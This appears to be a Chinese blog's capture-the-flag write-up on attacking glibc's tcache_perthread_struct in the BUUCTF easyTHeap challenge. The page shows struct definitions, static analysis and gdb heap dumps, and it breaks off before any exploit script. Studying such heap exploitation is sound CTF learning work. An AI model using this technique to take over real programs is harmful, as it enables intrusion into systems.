<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>PWN入门（3-18-1）-Tcache Attack中的tcache_perthread_struct（基础、例题）（附：向__malloc_hook中写入one_gadget无法getshell的问题及解决方案） | Cyberangel-blog</title><meta name="author" content="Cyberangel"><meta name="copyright" content="Cyberangel"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="参考资料：https:&#x2F;&#x2F;www.cnblogs.com&#x2F;Theffth-blog&#x2F;p&#x2F;12790720.html &gt; https:&#x2F;&#x2F;blog.csdn.net&#x2F;weixin_43833642&#x2F;article&#x2F;details&#x2F;107166551题目来源：BUUCTF-[V&amp;N2020 公开赛]easyTHeap附件：链接: https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1T1p">
<meta property="og:type" content="article">
<meta property="og:title" content="PWN入门（3-18-1）-Tcache Attack中的tcache_perthread_struct（基础、例题）（附：向__malloc_hook中写入one_gadget无法getshell的问题及解决方案）">
<meta property="og:url" content="https://cyberangel.cn/2020/12/02/PWN%E5%85%A5%E9%97%A8%EF%BC%883-18-1%EF%BC%89-Tcache%20Attack%E4%B8%AD%E7%9A%84tcache_perthread_struct%EF%BC%88%E5%9F%BA%E7%A1%80%E3%80%81%E4%BE%8B%E9%A2%98%EF%BC%89%EF%BC%88%E9%99%84%EF%BC%9A%E5%90%91__malloc_hook%E4%B8%AD%E5%86%99%E5%85%A5one_gadget%E6%97%A0%E6%B3%95getshell%E7%9A%84/index.html">
<meta property="og:site_name" content="Cyberangel-blog">
<meta property="og:description" content="参考资料：https:&#x2F;&#x2F;www.cnblogs.com&#x2F;Theffth-blog&#x2F;p&#x2F;12790720.html &gt; https:&#x2F;&#x2F;blog.csdn.net&#x2F;weixin_43833642&#x2F;article&#x2F;details&#x2F;107166551题目来源：BUUCTF-[V&amp;N2020 公开赛]easyTHeap附件：链接: https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1T1p">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg">
<meta property="article:published_time" content="2020-12-02T10:56:50.000Z">
<meta property="article:modified_time" content="2021-07-04T09:57:14.307Z">
<meta property="article:author" content="Cyberangel">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://cyberangel.cn/2020/12/02/PWN%E5%85%A5%E9%97%A8%EF%BC%883-18-1%EF%BC%89-Tcache%20Attack%E4%B8%AD%E7%9A%84tcache_perthread_struct%EF%BC%88%E5%9F%BA%E7%A1%80%E3%80%81%E4%BE%8B%E9%A2%98%EF%BC%89%EF%BC%88%E9%99%84%EF%BC%9A%E5%90%91__malloc_hook%E4%B8%AD%E5%86%99%E5%85%A5one_gadget%E6%97%A0%E6%B3%95getshell%E7%9A%84/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
    },
    fancybox: {
      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: true
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'PWN入门（3-18-1）-Tcache Attack中的tcache_perthread_struct（基础、例题）（附：向__malloc_hook中写入one_gadget无法getshell的问题及解决方案）',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2021-07-04 17:57:14'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const fontSizeVal = saveToLocal.get('global-font-size')
    if (fontSizeVal !== undefined) {
      document.documentElement.style.setProperty('--global-font-size', fontSizeVal + 'px')
    }
    
    const detectApple = () => {
      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Cyberangel-blog" type="application/atom+xml">
</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/1.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">317</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Cyberangel-blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">PWN入门（3-18-1）-Tcache Attack中的tcache_perthread_struct（基础、例题）（附：向__malloc_hook中写入one_gadget无法getshell的问题及解决方案）</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-12-02T10:56:50.000Z" title="发表于 2020-12-02 18:56:50">2020-12-02</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-07-04T09:57:14.307Z" title="更新于 2021-07-04 17:57:14">2021-07-04</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="PWN入门（3-18-1）-Tcache Attack中的tcache_perthread_struct（基础、例题）（附：向__malloc_hook中写入one_gadget无法getshell的问题及解决方案）"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span><span class="post-meta-separator">|</span><span class="post-meta-commentcount"><i class="far fa-comments fa-fw post-meta-icon"></i><span class="post-meta-label">评论数:</span><span class="disqus-comment-count"><a href="https://cyberangel.cn/2020/12/02/PWN%E5%85%A5%E9%97%A8%EF%BC%883-18-1%EF%BC%89-Tcache%20Attack%E4%B8%AD%E7%9A%84tcache_perthread_struct%EF%BC%88%E5%9F%BA%E7%A1%80%E3%80%81%E4%BE%8B%E9%A2%98%EF%BC%89%EF%BC%88%E9%99%84%EF%BC%9A%E5%90%91__malloc_hook%E4%B8%AD%E5%86%99%E5%85%A5one_gadget%E6%97%A0%E6%B3%95getshell%E7%9A%84/#disqus_thread"></a></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><blockquote>
<p>参考资料：<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Theffth-blog/p/12790720.html">https://www.cnblogs.com/Theffth-blog/p/12790720.html</a> &gt; <a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43833642/article/details/107166551">https://blog.csdn.net/weixin_43833642/article/details/107166551</a><br>题目来源：BUUCTF-[V&amp;N2020 公开赛]easyTHeap<br>附件：<br>链接: <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1T1pV_mbUEPXCg-vlu_Yw7w">https://pan.baidu.com/s/1T1pV_mbUEPXCg-vlu_Yw7w</a>   密码: 5fnk<br>–来自百度网盘超级会员 V3 的分享<br><strong>待整合</strong><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Theffth-blog/p/12790720.html"><strong>https://www.cnblogs.com/Theffth-blog/p/12790720.html</strong></a><strong>文章中的内容</strong></p>
</blockquote>
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>由于 CTF-wiki 上没有例子，因此我们直接拿题目来说明。<br>在堆题中，我们常见的一种泄露地址的方法是泄露<code>unsortedbin</code>中 chunk 的<code>fd</code>和<code>bk</code>，而在严格限制 chunk 大小的堆题中，如果有<code>tcache</code>机制的影响，我们必须需要先将<code>tcache Bin</code>填满，才能把 chunk 放入<code>unsortedbin</code>中，再进行地址泄露。于是，有些堆题会对<code>malloc</code>和<code>free</code>操作的次数设定限制，这时我们可以考虑伪造<code>tcache</code>机制的主体<code>tcache_perthread_struct</code>结构体。在源代码中对其定义如下：</p>
<blockquote>
<p>libc-2.27.so</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#glibc-malloc源码中的第2902-2921行</span></span><br><span class="line"><span class="comment">/* We overlay this structure on the user-data portion of a chunk when</span></span><br><span class="line"><span class="comment">   the chunk is stored in the per-thread cache.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span><span class="comment">//指向的下一个chunk的next字段</span></span><br><span class="line">&#125; tcache_entry;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* There is one of these for each thread, which contains the</span></span><br><span class="line"><span class="comment">   per-thread cache (hence &quot;tcache_perthread_struct&quot;).  Keeping</span></span><br><span class="line"><span class="comment">   overall size low is mildly important.  Note that COUNTS and ENTRIES</span></span><br><span class="line"><span class="comment">   are redundant (we could have just counted the linked list each</span></span><br><span class="line"><span class="comment">   time), this is for performance reasons.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">char</span> counts[TCACHE_MAX_BINS];<span class="comment">//数组长度64，每个元素最大为0x7，仅占用一个字节（对应64个tcache链表）</span></span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];<span class="comment">//entries指针数组（对应64个tcache链表，cache bin中最大为0x400字节</span></span><br><span class="line">  <span class="comment">//每一个指针指向的是对应tcache_entry结构体的地址。</span></span><br><span class="line">&#125; tcache_perthread_struct;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> __thread <span class="keyword">bool</span> tcache_shutting_down = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">static</span> __thread tcache_perthread_struct *tcache = <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure>

<p>从上面可以看到：<code>tcache_perthread_struct</code>结构体首先是类型为 char（一个字节）的 counts 数组，用于存放 64 个 bins 中的 chunk 数量，随后依次是对应 size 大小<code>0x20-0x400</code>的 64 个 entries（8 个字节），用于存放 64 个 bins 的 Bin 头地址。</p>
<h1 id="Linux-环境"><a href="#Linux-环境" class="headerlink" title="Linux 环境"></a>Linux 环境</h1><p><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1606984482581-d7a44660-925d-4b2f-b479-df108f3d0eec.png#align=left&display=inline&height=664&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2020-12-03%2016.34.38.png&originHeight=664&originWidth=1408&size=151986&status=done&style=none&width=1408" alt="截屏2020-12-03 16.34.38.png"></p>
<h1 id="文件保护"><a href="#文件保护" class="headerlink" title="文件保护"></a>文件保护</h1><p>首先先来看一下文件的保护情况：<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1606984640379-ebbaee54-3f49-4405-a33b-62ce6fe0945c.png#align=left&display=inline&height=296&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2020-12-03%2016.37.13.png&originHeight=296&originWidth=1066&size=49768&status=done&style=none&width=1066" alt="截屏2020-12-03 16.37.13.png"><br>程序的保护全开，难受。。。</p>
<h1 id="IDA-静态分析"><a href="#IDA-静态分析" class="headerlink" title="IDA 静态分析"></a>IDA 静态分析</h1><p>题目下载下来之后，对其进行静态分析：</p>
<h2 id="sub-A39-–init"><a href="#sub-A39-–init" class="headerlink" title="sub_A39()–init"></a>sub_A39()–init</h2><p><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1606985154169-0a94df68-6013-449a-b483-268b88a36def.png#align=left&display=inline&height=260&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2020-12-03%2016.45.49.png&originHeight=260&originWidth=602&size=57273&status=done&style=none&width=602" alt="截屏2020-12-03 16.45.49.png"><br>这个函数里面包含着许多函数，绝大部分都是初始化内存函数。<br>但是里面有个 alarm 函数，这会干扰我们之后的动态调试，根据下图的机器码在 hex 编辑器里寻找其对应的位置进行 patch：<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1606985302014-7576a185-4e38-4c60-b0b9-92f25b58e62e.png#align=left&display=inline&height=146&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2020-12-03%2016.48.18.png&originHeight=146&originWidth=1648&size=59685&status=done&style=none&width=1648" alt="截屏2020-12-03 16.48.18.png"></p>
<p>patch 之后的效果如下：<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1606986698341-af5db191-9b1c-4bcc-9dbe-5c18f259026d.png#align=left&display=inline&height=264&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2020-12-03%2017.11.34.png&originHeight=264&originWidth=594&size=56949&status=done&style=none&width=594" alt="截屏2020-12-03 17.11.34.png">、<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1606986778453-686d2bbf-8441-4c0c-a3c4-7d7a730739e4.png#align=left&display=inline&height=202&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2020-12-03%2017.12.43.png&originHeight=202&originWidth=1636&size=74832&status=done&style=none&width=1636" alt="截屏2020-12-03 17.12.43.png"><br>根据这个程序，不妨我们将 sub_a39 函数重命名为 init_func（初始化）。</p>
<h2 id="sub-DCF-–menu"><a href="#sub-DCF-–menu" class="headerlink" title="sub_DCF()–menu"></a>sub_DCF()–menu</h2><p>这个函数是程序的菜单函数，我们将其重命名为 menu：<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1606987048956-81091b9e-bef3-4363-bb1a-2ea6b7cbab94.png#align=left&display=inline&height=264&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2020-12-03%2017.17.24.png&originHeight=264&originWidth=366&size=44831&status=done&style=none&width=366" alt="截屏2020-12-03 17.17.24.png"></p>
<h2 id="sub-9EA-–input-func"><a href="#sub-9EA-–input-func" class="headerlink" title="sub_9EA()–input_func"></a>sub_9EA()–input_func</h2><p><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1606987134485-4c5dcb8f-cc86-45be-b9de-e61ec5b37b80.png#align=left&display=inline&height=276&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2020-12-03%2017.18.51.png&originHeight=276&originWidth=748&size=51356&status=done&style=none&width=748" alt="截屏2020-12-03 17.18.51.png"><br>没有什么好说的，程序会根据输入来执行对应的功能，将其重命名为 input_func</p>
<h2 id="1、sub-AFF-–add"><a href="#1、sub-AFF-–add" class="headerlink" title="1、sub_AFF()–add"></a>1、sub_AFF()–add</h2><p><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1606988115361-8e47635c-f7b1-4ad8-9b6f-d845432ecd57.png#align=left&display=inline&height=780&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2020-12-03%2017.35.11.png&originHeight=780&originWidth=1734&size=187313&status=done&style=none&width=1734" alt="截屏2020-12-03 17.35.11.png"></p>
<h2 id="2、sub-BEA-–edit"><a href="#2、sub-BEA-–edit" class="headerlink" title="2、sub_BEA()–edit"></a>2、sub_BEA()–edit</h2><p><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1606988539573-0d49769d-45e1-4f87-9d7d-3a2cba80d51f.png#align=left&display=inline&height=356&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2020-12-03%2017.42.16.png&originHeight=356&originWidth=1274&size=83767&status=done&style=none&width=1274" alt="截屏2020-12-03 17.42.16.png"></p>
<h2 id="3、sub-CA4-–show"><a href="#3、sub-CA4-–show" class="headerlink" title="3、sub_CA4()–show"></a>3、sub_CA4()–show</h2><p><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1606988705933-27870240-ec87-4ed4-907b-8dd54eeeaee8.png#align=left&display=inline&height=334&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2020-12-03%2017.45.02.png&originHeight=334&originWidth=1076&size=71444&status=done&style=none&width=1076" alt="截屏2020-12-03 17.45.02.png"></p>
<h2 id="4、sub-D2C-–delete"><a href="#4、sub-D2C-–delete" class="headerlink" title="4、sub_D2C()–delete"></a>4、sub_D2C()–delete</h2><p><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1606989502706-fbe5c702-9650-460b-b67a-e7eade49b934.png#align=left&display=inline&height=354&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2020-12-03%2017.58.19.png&originHeight=354&originWidth=1456&size=94719&status=done&style=none&width=1456" alt="截屏2020-12-03 17.58.19.png"></p>
<h2 id="main-函数"><a href="#main-函数" class="headerlink" title="main 函数"></a>main 函数</h2><p><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1606989026600-0a45336d-9f51-47a3-a5d6-6534ec0a669f.png#align=left&display=inline&height=1228&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2020-12-03%2017.50.22.png&originHeight=1228&originWidth=1650&size=260287&status=done&style=none&width=1650" alt="截屏2020-12-03 17.50.22.png"></p>
<h1 id="pwndbg-动态调试"><a href="#pwndbg-动态调试" class="headerlink" title="pwndbg 动态调试"></a>pwndbg 动态调试</h1><p>首先关闭系统的 ALSR：<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1607063044671-0d62bf92-cac4-4ff4-8a10-5acb319efb5b.png#align=left&display=inline&height=294&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2020-12-04%2014.24.01.png&originHeight=294&originWidth=1286&size=51925&status=done&style=none&width=1286" alt="截屏2020-12-04 14.24.01.png"><br>验证一下：<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1607063069422-3fd34668-9a33-42c1-905a-fb447485884f.png#align=left&display=inline&height=332&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2020-12-04%2014.24.24.png&originHeight=332&originWidth=1336&size=69937&status=done&style=none&width=1336" alt="截屏2020-12-04 14.24.24.png"><br>两次地址不再发生改变，说明程序运行时的 PIE 保护已经无效。<br>动态调试主要确定一下 IDA 中 bss 段全局变量和 data 段中变量具体的所在位置，开始 gdb 调试程序：<br>先来确定一下 data 段中 free_count 和 malloc_count 的位置：<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1607063464342-8cc0a990-618d-4c1d-bd78-8dd155adbdb6.png#align=left&display=inline&height=112&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2020-12-04%2014.31.00.png&originHeight=112&originWidth=1944&size=57525&status=done&style=none&width=1944" alt="截屏2020-12-04 14.31.00.png"><br>下面是程序运行时内存的分布情况：<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1607063501231-b02f1782-fd14-4e09-8705-613f8c09cded.png#align=left&display=inline&height=696&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2020-12-04%2014.31.38.png&originHeight=696&originWidth=1884&size=170560&status=done&style=none&width=1884" alt="截屏2020-12-04 14.31.38.png"><br>由于这两个变量存在于 data 段，在内存中对应一下：<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1607063580418-6f85ae4e-4fbc-46f7-8199-2d25493e98ee.png#align=left&display=inline&height=110&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2020-12-04%2014.32.56.png&originHeight=110&originWidth=1794&size=38298&status=done&style=none&width=1794" alt="截屏2020-12-04 14.32.56.png"><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1607063608267-aec47f9e-dc09-4878-ba0f-3b99d542a79f.png#align=left&display=inline&height=256&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2020-12-04%2014.33.24.png&originHeight=256&originWidth=1452&size=46129&status=done&style=none&width=1452" alt="截屏2020-12-04 14.33.24.png"><br>图中白色地方的数据就是 free_count 和 malloc_count<br>接下来我们创建三个 chunk（这里输入的大小为 10,40,80），寻找一下 chunk_input_size 和 malloc_data_ptr 在内存中所处的位置，寻找结果如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x555555757000</span></span><br><span class="line">Size: <span class="number">0x251</span></span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x555555757250</span></span><br><span class="line">Size: <span class="number">0x21</span></span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x555555757270</span></span><br><span class="line">Size: <span class="number">0x31</span></span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x5555557572a0</span></span><br><span class="line">Size: <span class="number">0x61</span></span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x555555757300</span></span><br><span class="line">Size: <span class="number">0x20d01</span></span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/<span class="number">200</span>gx <span class="number">0x555555757000</span></span><br><span class="line"><span class="number">0x555555757000</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000251</span> #tcache_perthread_struct</span><br><span class="line">.......(省略内容均为空)</span><br><span class="line"><span class="number">0x555555757250</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000021</span> #chunk1</span><br><span class="line"><span class="number">0x555555757260</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555757270</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span> #chunk2</span><br><span class="line"><span class="number">0x555555757280</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555757290</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5555557572a0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000061</span> #chunk3</span><br><span class="line">.......(省略内容均为空)</span><br><span class="line"><span class="number">0x555555757300</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000020d01</span> #top_chunk</span><br><span class="line">.......(省略内容均为空)</span><br><span class="line"><span class="number">0x555555757630</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure>

<p>从上面可以得到，chunk1 的 data 指针所指向的地址为 0x555555757260，对应一下内存：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">16</span>gx <span class="number">0x555555756060</span></span><br><span class="line"><span class="number">0x555555756060</span>:	<span class="number">0x000000280000000a</span>	<span class="number">0x0000000000000050</span> #chunk_input_size</span><br><span class="line">    			#size2    #size1              #size3</span><br><span class="line"><span class="number">0x555555756070</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555756080</span>:	<span class="number">0x0000555555757260</span>	<span class="number">0x0000555555757280</span> 